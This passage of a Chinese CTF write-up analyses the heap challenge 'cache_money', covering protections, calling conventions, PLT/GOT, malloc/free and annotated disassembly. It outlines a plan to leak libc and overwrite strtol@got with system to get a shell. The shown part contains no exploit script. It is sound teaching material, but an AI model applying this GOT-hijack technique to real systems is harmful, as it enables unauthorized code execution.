libc.so.6                Ubuntu 24.04 glibc 2.39-0ubuntu8.3（從 pwn2/pwn6 借來對齊遠端）
ld-linux-x86-64.so.2     對應的 loader
flag.txt                 本地測試用假 flag
dis.txt                  objdump -d -M intel 的完整反組譯
cm_dbg                   patchelf 過的除錯副本（把 interpreter 指到本地 2.39 loader）
work/                    開發過程的 gdb script 與實驗腳本
\end{Verbatim}

\begin{quote}
\textbf{為什麼要自己放一份 libc？} \texttt{cache\_\allowbreak{}money} 的
\texttt{RUNPATH} 是 \texttt{\$\allowbreak{}ORIGIN}（先找執行檔旁邊），但題目沒附
libc。 本機 Arch Linux 的 libc 是 2.44，跟遠端的 2.39 \textbf{行為與
offset 都不一樣}。 這題的編譯器 metadata 顯示是 Ubuntu 24.04，而同一場
CTF 的 pwn2/pwn6 都附了
\texttt{Ubuntu\ \allowbreak{}GLIBC\ \allowbreak{}2.\allowbreak{}39-\allowbreak{}0ubuntu8.\allowbreak{}3}，所以我把那份 libc
複製過來，本地就能 100\% 對齊遠端。 沒放 libc 時 \texttt{exploit.\allowbreak{}py}
會直接跑 \texttt{./\allowbreak{}cache\_\allowbreak{}money}（本機系統 libc），照樣能動， 只是 local
的 libc offset 不同 → exploit 會靠 leak 自己算 base，但 \texttt{system}
的 offset 是寫死 2.39 的，所以\textbf{本地驗證請務必用 2.39}。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{2.
保護機制（checksec）}\label{ux4fddux8b77ux6a5fux5236checksec}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
$ readelf -h cache_money | grep Type
  Type: EXEC (Executable file)          <- non-PIE
$ readelf -l cache_money | grep -A1 GNU_RELRO
  GNU_RELRO 0x2dc0 0x403dc0 0x403dc0    <- 保護範圍 0x403dc0 ~ 0x404000（size 0x240）
    0x240 0x240 R 0x1                        = .init_array/.fini_array/.got
                                             ＋ .got.plt 的前 0x18 bytes
$ readelf -S cache_money | grep -E "\.got|\.init_array|\.fini_array"
  [20] .init_array  0000000000403dc0     <- 在 RELRO 內（唯讀）
  [21] .fini_array  0000000000403dd0     <- 在 RELRO 內（唯讀）
  [23] .got         0000000000403fd8     <- ✶ 也在 RELRO 內（唯讀）
  [24] .got.plt     0000000000403fe8     <- 只有前 0x18 bytes（到 0x404000）被保護
$ objdump -R cache_money | head             # 函式 GOT 從 0x404000 起 → 可寫 ✓
$ readelf -d cache_money | grep -i bind  <- 沒有 BIND_NOW
  (空)
$ readelf -d cache_money | grep FLAGS
  0x1e (FLAGS)      ORIGIN
\end{Verbatim}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}
  >{\raggedright\arraybackslash}p{(\linewidth - 6\tabcolsep) * \real{0.2500}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
保護
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
狀態
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
白話解釋
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
對解題的影響
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\textbf{PIE} & ✗ 關閉（non-PIE） & 程式碼/資料段\textbf{不會}被 ASLR
隨機化，永遠載入到 \texttt{0x400000} &
\textbf{超大幫助}：\texttt{0x4040c0}（slot
表）、\texttt{0x404040}（strtol 的 GOT）等位址都是固定常數，可以寫死在
exploit 裡 \\
\textbf{Canary} & ✓ 開啟 & 每個函式在 stack frame
放一個隨機值，函式返回前比對（\texttt{sub\ \allowbreak{}rax,\allowbreak{}\ \allowbreak{}fs:\allowbreak{}0x28}），被改到就
\texttt{\_\allowbreak{}\_\allowbreak{}stack\_\allowbreak{}chk\_\allowbreak{}fail} 自殺 & 擋掉「直接蓋 return
address」的老招；但這題是 heap 題，我們\textbf{根本不去碰 stack}，所以
canary 完全沒造成困擾 \\
\textbf{NX} & ✓ 開啟 & stack/heap 不可執行 & 不能把 shellcode 丟到 heap
上執行 → 要走 ret2libc / GOT hijack 這條路 \\
\textbf{RELRO} & ※注意 Partial & RELRO 覆蓋
\texttt{0x403dc0\textasciitilde{}\allowbreak{}0x404000}（size
0x240）：\texttt{.\allowbreak{}init\_\allowbreak{}array}/\texttt{.\allowbreak{}fini\_\allowbreak{}array} 和
\textbf{\texttt{.\allowbreak{}got}（\texttt{0x403fd8}）都變唯讀}，\texttt{.\allowbreak{}got.\allowbreak{}plt}
只有開頭 0x18 bytes 落在保護範圍內。\textbf{可寫的是 \texttt{0x404000}
之後的「函式 GOT 項目」（含 \texttt{strtol@0x404040}）} & 我們可以把
\texttt{strtol@got} 改成 \texttt{system} \\
\textbf{ASLR} & ✓ 開啟 & libc/heap/stack 的位址每次執行都不同 &
必須先\textbf{洩漏（leak）} libc base 與 heap 資訊 \\
\end{longtable}
}

\paragraph{這四個保護合起來告訴我們什麼？}\label{ux9019ux56dbux500bux4fddux8b77ux5408ux8d77ux4f86ux544aux8a34ux6211ux5011ux4ec0ux9ebc}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  non-PIE → 程式自己的位址固定 → 有「固定的攻擊目標」。
\item
  Partial RELRO → GOT 可寫 → 有「固定的寫入目標」。
\item
  NX + canary → 不能用 stack smash → 想辦法\textbf{改
  GOT}或\textbf{改程式自己的資料}。
\item
  ASLR → 需要資訊洩漏（leak）。
\end{enumerate}

結論：\textbf{這題的解法一定是「heap 漏洞 → leak libc → 寫 GOT」}。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{3.
必備基礎知識}\label{ux5fc5ux5099ux57faux790eux77e5ux8b58}

\paragraph{3.1
暫存器的用途（x86-64）}\label{ux66abux5b58ux5668ux7684ux7528ux9014x86-64}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
rax  累加器，函式「回傳值」放這裡（系統呼叫編號也放這）
rbx  被呼叫者保存（callee-saved），函式必須原樣還回去
rcx  第 4 個參數 / 計數器
rdx  第 3 個參數
rsi  第 2 個參數（在 libc 函式裡常叫 "src"）
rdi  第 1 個參數（常叫 "dst"）
rbp  框架指標 (frame pointer)，指向目前 stack frame 的底部
rsp  堆疊指標 (stack pointer)，永遠指向堆疊最頂端（最低位址）
r8, r9  第 5、6 個參數（r10、r11 是 caller-saved 暫存器，**不是**參數暫存器；
         r10 只在 syscall 時當第 4 個參數）
r12~r15 被呼叫者保存
rip  下一條要執行的指令位址
fs   執行緒區域儲存區的段暫存器；fs:0x28 就是 **stack canary**
\end{Verbatim}

\paragraph{3.2 System V AMD64 呼叫慣例（Linux
上函式怎麼傳參數）}\label{system-v-amd64-ux547cux53ebux6163ux4f8blinux-ux4e0aux51fdux5f0fux600eux9ebcux50b3ux53c3ux6578}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}llllllll@{}}
\toprule\noalign{}
順序 & 1 & 2 & 3 & 4 & 5 & 6 & 7+ \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
暫存器 & \texttt{rdi} & \texttt{rsi} & \texttt{rdx} & \texttt{rcx} &
\texttt{r8} & \texttt{r9} & 放 stack \\
\end{longtable}
}

\begin{itemize}
\tightlist
\item
  回傳值在 \texttt{rax}。
\item
  呼叫前 \texttt{rsp} 必須 16 位元組對齊（\texttt{call} 會壓 8 bytes
  返回位址，所以函式入口是 \texttt{rsp\ \allowbreak{}\%\allowbreak{}\ \allowbreak{}16\ \allowbreak{}==\ \allowbreak{}8}）。
\item
  所以在反組譯裡看到 \texttt{mov\ \allowbreak{}edi,\allowbreak{}\ \allowbreak{}2} /
  \texttt{lea\ \allowbreak{}rsi,\allowbreak{}\ \allowbreak{}{[}...{]}} / \texttt{mov\ \allowbreak{}edx,\allowbreak{}\ \allowbreak{}...}
  就是在「排參數」。
\end{itemize}

例：本題 \texttt{Withdraw} 印餘額的那段

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
401972: mov    rdx,QWORD PTR [rbx+0x10]   ; 第 3 參數 = balance
401976: add    rsp,0x30
40197a: lea    rsi,[rip+0xc32]      ; 第 2 參數 = 格式字串 # 4025b3
401981: xor    eax,eax              ; 可變參數函式要先清 eax
401983: mov    edi,0x2              ; 第 1 參數 = __printf_chk 的 flag
401988: pop    rbx
401989: jmp    4011b0 <__printf_chk@plt>   ; ✶ 尾呼叫（tail call）：用 jmp 不是 call
\end{Verbatim}

\paragraph{\texorpdfstring{3.3 \texttt{call} / \texttt{ret} /
\texttt{leave} / stack
frame}{3.3 call / ret / leave / stack frame}}\label{call-ret-leave-stack-frame}

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{call} \BaseNTok{0x401510}     \CommentTok{; 等價於 push \textless{}下一條指令位址\textgreater{}; jmp 0x401510}
                  \CommentTok{; 把「返回位址」壓進 stack，之後 ret 才知道要回哪}

\ControlFlowTok{ret}               \CommentTok{; 等價於 pop rip  → 從 stack 取出一個位址跳過去}
                  \CommentTok{; ✶ 這就是為什麼「蓋掉 stack 上的返回位址」可以控制執行流}

\BuiltInTok{push} \KeywordTok{rbp}          \CommentTok{; 函式開頭常見：保存呼叫者的 rbp}
\BuiltInTok{mov}  \KeywordTok{rbp}\OperatorTok{,} \KeywordTok{rsp}     \CommentTok{; 建立自己的 stack frame}
\BuiltInTok{sub}  \KeywordTok{rsp}\OperatorTok{,} \BaseNTok{0x38}    \CommentTok{; 配置區域變數空間}
\NormalTok{...}
\BuiltInTok{leave}             \CommentTok{; 等價於 mov rsp, rbp; pop rbp  （拆除 stack frame）}
\ControlFlowTok{ret}
\end{Highlighting}
\end{Shaded}

一個函式的 stack frame 長這樣（位址往下長）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
   高位址
   ┌──────────────────────┐
   │ 呼叫者的區域變數     │
   ├──────────────────────┤
   │ 返回位址 (8 bytes)   │  <-- 覆蓋這裡 = 控制執行流（本題用不到）
   ├──────────────────────┤  <-- rbp 進函式前
   │ 舊的 rbp             │
   ├──────────────────────┤  <-- rbp（frame pointer）
   │ 區域變數             │
   │ ...                  │
   │ [rsp+0x28] canary    │  <-- fs:0x28 的副本
   ├──────────────────────┤  <-- rsp
   低位址
\end{Verbatim}

\paragraph{3.4 PLT /
GOT：動態連結的「電話簿」}\label{plt-gotux52d5ux614bux9023ux7d50ux7684ux96fbux8a71ux7c3f}

程式呼叫 \texttt{strtol} 時，其實是呼叫 \texttt{strtol@plt}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
0000000000401190 <strtol@plt>:
  401190: endbr64
  401194: jmp QWORD PTR [rip+0x2ea6]   # 404040 <-- strtol 的 GOT
\end{Verbatim}

（\texttt{0x401194\ \allowbreak{}+\ \allowbreak{}6\ \allowbreak{}+\ \allowbreak{}0x2ea6\ \allowbreak{}=\ \allowbreak{}0x404040} ✓ ------ rip
是「\textbf{下一條指令}」的位址， 所以是加 6，不是加 5。）

\begin{itemize}
\tightlist
\item
  \textbf{GOT}（\texttt{.\allowbreak{}got.\allowbreak{}plt}，本題在 \texttt{0x404000}
  起）是一張表，每一格存「真正的 libc 函式位址」。
\item
  第一次呼叫時，GOT 裡還指向 PLT 的解析器；libc
  解析完後會\textbf{把真正的位址寫進 GOT}。
\item
  之後每次呼叫都直接 \texttt{jmp\ \allowbreak{}{[}got{]}} → 直奔 libc。
\end{itemize}

\begin{quote}
\textbf{Partial RELRO 的意思是：這張表還可以被寫！}
所以只要我們能「寫任意位址」，把 \texttt{0x404040}（\texttt{strtol}
的格子）改成 \texttt{system} 的位址， 程式之後每次呼叫 \texttt{strtol}
其實都在呼叫 \texttt{system}。
\end{quote}

本題的 GOT 表（\texttt{objdump\ \allowbreak{}-\allowbreak{}R}）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
0x404000 free        0x404028 read        0x404050 __printf_chk
0x404008 puts        0x404030 fgets       0x404058 setvbuf
0x404010 write       0x404038 calloc      0x404060 __memset_chk
0x404018 __stack_chk_fail 0x404040 strtol 0x404068 exit
0x404020 strcspn     0x404048 malloc
\end{Verbatim}

\paragraph{\texorpdfstring{3.5 \texttt{malloc} / \texttt{calloc} /
\texttt{free}
到底在做什麼}{3.5 malloc / calloc / free 到底在做什麼}}\label{malloc-calloc-free-ux5230ux5e95ux5728ux505aux4ec0ux9ebc}

這是 heap 題的全部基礎，用「圖書館管理員」比喻：

\begin{itemize}
\tightlist
\item
  \textbf{\texttt{malloc(n)}}：跟 glibc 要「至少 n
  bytes」的空記憶體，回傳一個\textbf{指標}。 實際上給你的區塊比 n 大（有
  header、有對齊），這個區塊叫 \textbf{chunk}。
\item
  \textbf{\texttt{calloc(a,\allowbreak{}\ \allowbreak{}b)}}：要 \texttt{a*b}
  bytes，而且\textbf{保證內容是 0}。 （本題的 wallet 結構就是用
  \texttt{calloc(1,\allowbreak{}\ \allowbreak{}0x30)} 開的。）
\item
  \textbf{\texttt{free(p)}}：把 p 指向的
  chunk「還給」glibc，並把它記到某個 \textbf{bin（回收桶）} 裡， 下次
  \texttt{malloc} 就能重複利用。\textbf{free
  之後那塊記憶體的內容不會被清掉}， 而且\textbf{指標變數 p
  本身還是同一個值}（不會自動變 NULL）。 → 這就是
  use-after-free（UAF）的根源：\textbf{free 了但指標還能用}。
\end{itemize}

glibc 拿記憶體的方式主要有兩種：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
        brk / sbrk（主執行緒的 heap，位址在程式後方，例如 0x405000）
        ─────────────────────────────────────────────
        [heap 起點] ...程式一直 malloc... [top chunk] ← 不夠就往上長

        mmap（很大的配置 > 128KB 時，位址在 0x7f... 附近）
\end{Verbatim}

本題所有 chunk 都來自 \textbf{主 arena（brk heap）}，所以 heap
位址是連續的。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{4.
逐行組語解說}\label{ux9010ux884cux7d44ux8a9eux89e3ux8aaa}

\begin{quote}
位址都是 \texttt{objdump\ \allowbreak{}-\allowbreak{}d\ \allowbreak{}-\allowbreak{}M\ \allowbreak{}intel\ \allowbreak{}cache\_\allowbreak{}money} 出來的真實位址。
§4.2\textasciitilde§4.6 的組語區塊是\textbf{直接從 \texttt{objdump}
貼過來的}（只拿掉機器碼那一欄、 加上 \texttt{←}
的中文註解），所以你可以逐條在自己的 objdump 裡對位址。
為了可讀性我省略了部分 \texttt{endbr64}／\texttt{nop}（CET
用的填充指令，沒有實際作用）， 但\textbf{每一條有語意的指令位址都與
binary 一致}。
\end{quote}

\paragraph{\texorpdfstring{4.1
\texttt{main}：程式入口與選單分派（0x4011f0）}{4.1 main：程式入口與選單分派（0x4011f0）}}\label{mainux7a0bux5f0fux5165ux53e3ux8207ux9078ux55aeux5206ux6d3e0x4011f0}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
4011f0: endbr64
4011f4: push   rbp
4011f5: lea    rbp,[rip+0x14b0]     # 4026ac   ← 跳表的位址（不是 frame pointer！）
4011fc: push   rbx
4011fd: sub    rsp,0x38                       ← 開 0x38 bytes 的區域空間
401201: mov    rax,QWORD PTR fs:0x28           ← 拿出 canary
40120a: mov    QWORD PTR [rsp+0x28],rax        ← 存到 stack
401211: mov    rbx,rsp                         ← rbx = 輸入緩衝區（等等 fgets 用）
401214: call   4013e0                          ← print_banner()
401219: call   401420                          ← print_menu()  ← 迴圈起點
40121e: mov    rdx,QWORD PTR [rip+0x2e6b]      # 404090 = stdin
401225: mov    esi,0x20                        ← 最多讀 0x20-1 個字
40122a: mov    rdi,rbx                         ← buf
40122d: call   fgets@plt                       ← fgets(buf, 0x20, stdin)
401232: test   rax,rax
401235: je     401264                          ← 讀到 EOF → exit(0)
401237: xor    esi,esi                         ← strtol 第 2 參數 = NULL
401239: mov    edx,0xa                         ← 第 3 參數 = 10（十進位）
40123e: mov    rdi,rbx
401241: call   strtol@plt                      ← 選單選項 = strtol(buf, NULL, 10)
401246: cmp    eax,0x6
401249: ja     401295                          ← 大於 6 → 印「Invalid option」
40124b: mov    eax,eax                         ← 清掉高位（無號）
40124d: movsxd rax,DWORD PTR [rbp+rax*4]       ← ✶ 32-bit 相對跳表
401252: add    rax,rbp
401255: notrack jmp rax                        ← 跳到對應的 handler
\end{Verbatim}

跳表內容（\texttt{0x4026ac} 開始，每格 4 bytes 的「相對位移」）：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
選項 0 → 401258  puts("Cashing out...") ; exit(0)
選項 1 → 401287  Open Wallet   (0x4015b0)
選項 2 → 401280  Deposit       (0x4017d0)
選項 3 → 401279  Withdraw      (0x4018a0)
選項 4 → 401272  Transfer      (0x401a10)
選項 5 → 40126b  Close Wallet  (0x401b60)
選項 6 → 40128e  List Wallets  (0x401c90)
\end{Verbatim}

\begin{quote}
注意 \texttt{strtol(buf,\allowbreak{}\ \allowbreak{}NULL,\allowbreak{}\ \allowbreak{}10)}：\textbf{輸入的第一個 token
會被當成整數}。 這正是我們最後把 \texttt{strtol@got} 改成
\texttt{system} 之後，輸入 \texttt{/\allowbreak{}bin/\allowbreak{}sh} 就能拿到 shell 的原因：
\texttt{strtol("/\allowbreak{}bin/\allowbreak{}sh",\allowbreak{}\ \allowbreak{}NULL,\allowbreak{}\ \allowbreak{}10)} 會回傳 0，但\textbf{在那之前 GOT
已經被換成 system}， 所以實際執行的是 \texttt{system("/\allowbreak{}bin/\allowbreak{}sh")}（rdi =
buf = \texttt{"/\allowbreak{}bin/\allowbreak{}sh"}）。
\end{quote}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
4012b0: (建構子起點) setvbuf(stdout, NULL, 2, 0)   ← 呼叫在 0x4012c8；mode 2 = _IONBF = 完全不用緩衝
4012cd: (同一支)      setvbuf(stderr, NULL, 2, 0)   ← 呼叫在 0x4012e1
\end{Verbatim}

\textbf{stdout 是 unbuffered}，這對互動式 exploit
很重要（每一行輸出會立刻送出）。 但注意：\textbf{stdin
仍然有緩衝}，這個坑在 §10 會詳細講。

\paragraph{\texorpdfstring{4.2
\texttt{read\_\allowbreak{}int(rdi\ \allowbreak{}=\ \allowbreak{}prompt)}：共用的「問一個 0\textasciitilde15
的數字」（0x401510）}{4.2 read\_int(rdi = prompt)：共用的「問一個 0\textasciitilde15 的數字」（0x401510）}}\label{read_intrdi-promptux5171ux7528ux7684ux554fux4e00ux500b-015-ux7684ux6578ux5b570x401510}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
401510: endbr64
401514: push   rbx
401515: mov    rdx,rdi                 ← rdx = prompt 字串
401518: lea    rsi,[rip+0xfdb]         # 4024fa = "%s (0-%d): "
40151f: mov    edi,0x2                 ← __printf_chk 的 flag
401524: mov    ecx,0xf                 ← 第二個可變參數 = 15
401529: sub    rsp,0x30
40152d: mov    rax,QWORD PTR fs:0x28   ← canary
401536: mov    QWORD PTR [rsp+0x28],rax
40153b: xor    eax,eax
40153d: mov    rbx,rsp                 ← rbx = 本地緩衝區
401540: call   4011b0 <__printf_chk@plt>  ← printf("%s (0-%d): ", prompt, 15)
401545: mov    rdx,QWORD PTR [rip+0x2b44]   # 404090 = stdin
40154c: mov    esi,0x20
401551: mov    rdi,rbx
401554: call   401170 <fgets@plt>       ← fgets(buf, 0x20, stdin)
401559: test   rax,rax
40155c: je     401590                  ← ✶✶ EOF（fgets 回 NULL）→ 走 401590
40155e: mov    edx,0xa
401563: xor    esi,esi
401565: mov    rdi,rbx
401568: call   401190 <strtol@plt>
40156d: mov    edx,eax                 ← 只留低 32 bits（沒有 movsxd！）
40156f: cmp    eax,0xf                 ← ✶ 32-bit 無號比較
401572: ja     401597                  ← > 15 → puts("Invalid wallet index") 後回 -1
401574: mov    rax,QWORD PTR [rsp+0x28]
401579: sub    rax,QWORD PTR fs:0x28   ← canary 檢查
401582: jne    4015aa <__stack_chk_fail@plt>
401584: add    rsp,0x30
401588: mov    eax,edx                 ← 回傳值 = 使用者輸入的 index
40158a: pop    rbx
40158b: ret
401590: xor    edi,edi                 ← ✶✶ fgets 失敗（EOF）走這裡
401592: call   4011e0 <exit@plt>        ← exit(0)：**不是**回傳 -1！
401597: lea    rdi,[rip+0xf68]         # 402506 = "[!] Invalid wallet index."
40159e: call   401120 <puts@plt>
4015a3: mov    edx,0xffffffff          ← 只有「格式不合法」才會得到 -1
4015a8: jmp    401574                  ← 跳回 canary 檢查
4015aa: call   401140 <__stack_chk_fail@plt>
\end{Verbatim}

\textbf{重點 1：index 有做 \texttt{0..\allowbreak{}15} 的上界檢查，沒有負索引漏洞。}
負數／太大的值是用 \textbf{\texttt{cmp\ \allowbreak{}eax,\allowbreak{}0xf} + \texttt{ja}（32-bit
無號比較）一次擋掉}的： \texttt{strtol("-\allowbreak{}1")} 回傳
\texttt{0xffffffff}，當成無號就是 4294967295 \textgreater{} 15 → 直接
invalid。 所以「沒有負索引」這個結論是對的，但理由不是「先檢查
\texttt{js} 再看上界」。

\textbf{重點 2：EOF 不是「回 -1」，而是 \texttt{exit(0)}。}
\texttt{40155c:\allowbreak{}\ \allowbreak{}je\ \allowbreak{}401590} →
\texttt{401590:\allowbreak{}\ \allowbreak{}xor\ \allowbreak{}edi,\allowbreak{}edi;\ \allowbreak{}call\ \allowbreak{}exit@plt}。 這也是 exploit 最後用
\texttt{recvrepeat} 收尾時，程式會自己安靜結束的原因 （\texttt{fgets}
讀到 EOF → \texttt{exit(0)}，而不是回 -1 讓選單繼續跑）。

\paragraph{\texorpdfstring{4.3 \texttt{Open\ \allowbreak{}Wallet}（起點
0x4015b0，slot 掃描迴圈從 0x4015e0 開始）：建立
wallet}{4.3 Open Wallet（起點 0x4015b0，slot 掃描迴圈從 0x4015e0 開始）：建立 wallet}}\label{open-walletux8d77ux9ede-0x4015b0slot-ux6383ux63cfux8ff4ux5708ux5f9e-0x4015e0-ux958bux59cbux5efaux7acb-wallet}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
4015b0: endbr64                        ← ✶ 函式真正起點（main 的 401287 是 `call 4015b0`）
4015b4: push   r13
4015b6: push   r12
4015b8: push   rbp
4015b9: lea    rbp,[rip+0x2b00]        # 4040c0  ← ✶ slot 表基底
4015c0: push   rbx
4015c1: xor    ebx,ebx                 ← ebx = 候選 slot index = 0
4015c3: sub    rsp,0x38                ← 開 0x38 bytes 的區域空間（不是 0x20）
4015c7: mov    rax,QWORD PTR fs:0x28   ← canary
4015d0: mov    QWORD PTR [rsp+0x28],rax
4015d5: xor    eax,eax
      ┌── 找第一個空的 slot ────────────────────────────────
4015e0: cmp    QWORD PTR [rbp+rbx*8+0x0],0x0  ← slots[i] == NULL ?
4015e6: je     401620                          ← 找到空的 → 跳出
4015e8: add    rbx,0x1
4015ec: cmp    rbx,0x10                        ← 試到 16
4015f0: jne    4015e0
      │ (16 個都滿了)
4015f2: mov    rax,QWORD PTR [rsp+0x28]
4015f7: sub    rax,QWORD PTR fs:0x28          ← canary 檢查
401600: jne    4017ca <__stack_chk_fail@plt>
401606: lea    rdi,[rip+0xb73]                 # 402180 "[!] All wallet slots are full..."
40160d: add    rsp,0x38
401611: pop    rbx
401612: pop    rbp
401613: pop    r12
401615: pop    r13
401617: jmp    401120 <puts@plt>                ← 尾呼叫 puts(...)，然後返回
      └────────────────────────────────────────────────────
401620: mov    esi,0x1                 ← calloc 的 size  = 1
401625: mov    edi,0x30                ← calloc 的 nmemb = 0x30 → 共 0x30 bytes
40162a: call   401180 <calloc@plt>     ← ✶ 配置 wallet 結構
40162f: mov    r12,rax                 ← r12 = wallet 指標
401632: test   rax,rax
401635: je     4017af                  ← 失敗 → "[!] Out of memory."
40163b: mov    edx,ebx
40163d: lea    rsi,[rip+0xa6c]         # 4020b0 "[+] Opening wallet in slot #%d\n"
401644: mov    edi,0x2
401649: xor    eax,eax
40164b: call   4011b0 <__printf_chk@plt>   ← printf("[+] Opening wallet in slot #%d\n", ebx)
401650: lea    rsi,[rip+0xedc]         # 402533 "    Wallet name: "
401657: mov    edi,0x2
40165c: xor    eax,eax
40165e: call   4011b0 <__printf_chk@plt>   ← printf("    Wallet name: ")
401663: mov    rdx,QWORD PTR [rip+0x2a26]   # 404090 = stdin
40166a: mov    esi,0x10                ← ✶ 最多 0x10-1 = 15 個字
40166f: mov    rdi,r12                 ← 直接寫進 wallet+0x00
401672: call   401170 <fgets@plt>      ← fgets(wallet->name, 0x10, stdin)
401677: test   rax,rax
40167a: je     401780                  ← EOF → exit(0)
401680: lea    rsi,[rip+0xff6]         # 40267d  "\n"   ← ✶ 是 rsi（strcspn 的第 2 參數）
401687: mov    rdi,r12
40168a: mov    r13,rsp                 ← r13 = 本地緩衝區（等等讀 size 字串用）
40168d: call   401150 <strcspn@plt>    ← strcspn(name, "\n")
401692: mov    edx,0x20                ← printf 的第 3 個可變參數 = 0x20
401697: mov    edi,0x2
40169c: lea    rsi,[rip+0xa2d]         # 4020d0 "    Ledger size (0x%x - 0x%x): "
4016a3: mov    BYTE PTR [r12+rax*1],0x0    ← name[該位置] = '\0'（去掉換行）
4016a8: mov    ecx,0x100               ← printf 的第 4 個可變參數 = 0x100
4016ad: xor    eax,eax
4016af: call   4011b0 <__printf_chk@plt>   ← 印 "Ledger size (0x20 - 0x100): "
4016b4: mov    rdx,QWORD PTR [rip+0x29d5]   # 404090 = stdin
4016bb: mov    esi,0x20
4016c0: mov    rdi,r13
4016c3: call   401170 <fgets@plt>      ← fgets(rsp, 0x20, stdin)：讀 size 字串
4016c8: test   rax,rax
4016cb: je     401780                  ← EOF → exit(0)
4016d1: mov    rdi,r13
4016d4: mov    edx,0xa
4016d9: xor    esi,esi
4016db: call   401190 <strtol@plt>     ← 十進位
4016e0: movsxd r13,eax                 ← r13 = size
4016e3: lea    rax,[r13-0x20]          ← size - 0x20
4016e7: cmp    rax,0xe0
4016ed: ja     401790                  ← ✶ 無號 > 0xe0 → 不合法
4016f3: mov    QWORD PTR [r12+0x20],r13     ← wallet->size = size
4016f8: mov    rdi,r13
4016fb: call   4011a0 <malloc@plt>     ← ✶ 配置 ledger
401700: mov    QWORD PTR [r12+0x18],rax     ← wallet->ledger = 指標
401705: mov    rdi,rax
401708: test   rax,rax
40170b: je     4017a7                  ← malloc 失敗 → free(wallet) + "[!] Out of memory."
401711: xor    esi,esi                 ← memset 的值 = 0
401713: mov    rcx,r13                 ← destlen = size
401716: mov    rdx,r13                 ← n = size
401719: movsxd rbx,ebx                 ← ebx（slot index）轉成 64-bit（等一下存回 slots[]）
40171c: call   4011d0 <__memset_chk@plt>   ← ✶ memset(ledger, 0, size)
401721: xor    eax,eax
401723: mov    rcx,r13                 ← 參數：size
401726: mov    rdx,r12                 ← 參數：wallet 指標（給 %s 印名字）
401729: mov    QWORD PTR [r12+0x10],0x0     ← wallet->balance = 0
401732: lea    rsi,[rip+0x9e7]         # 402120 "[+] Wallet \"%s\" opened (%zu-byte ledger).\n"
401739: mov    edi,0x2
40173e: mov    DWORD PTR [r12+0x28],0x1     ← ✶ wallet->active = 1
401747: mov    QWORD PTR [rbp+rbx*8+0x0],r12  ← ✶ slots[index] = wallet
40174c: call   4011b0 <__printf_chk@plt>
401751: mov    rax,QWORD PTR [rsp+0x28]
401756: sub    rax,QWORD PTR fs:0x28   ← canary 檢查
401765: lea    rdi,[rip+0x9e4]         # 402150 "    Start depositing to build your fortune!"
401772: jmp    401120 <puts@plt>
      └─ 401790: 不合法 → puts("Size out of range. Defaulting to 0x80.")；
                  r13d = 0x80；jmp 4016f3（用預設大小繼續）
\end{Verbatim}

\textbf{檢查邏輯：\texttt{(unsigned)(size\ \allowbreak{}-\allowbreak{}\ \allowbreak{}0x20)\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}0xe0}
→ \texttt{0x20\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}size\ \allowbreak{}\textless{}\allowbreak{}=\ \allowbreak{}0x100}。}
負數因無號比較會被判不合法（會退回預設 \texttt{0x80}）。

\subparagraph{\texorpdfstring{Wallet
結構（\texttt{calloc(1,\allowbreak{}\ \allowbreak{}0x30)}，chunk size
0x40）}{Wallet 結構（calloc(1, 0x30)，chunk size 0x40）}}\label{wallet-ux7d50ux69cbcalloc1-0x30chunk-size-0x40}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
wallet 指標 W →
   +0x00  char   name[16]     ← fgets(name, 0x10)，最多 15 個字 + NUL
   +0x10  uint64 balance      ← 每次 Deposit 加上「實際讀到的位元組數」
   +0x18  void  *ledger       ← ✶ malloc(size) 的回傳值（我們要玩弄的目標）
   +0x20  uint64 size         ← ledger 大小（0x20..0x100）
   +0x28  uint32 active       ← 1 = 有效，0 = 已關閉/已轉出
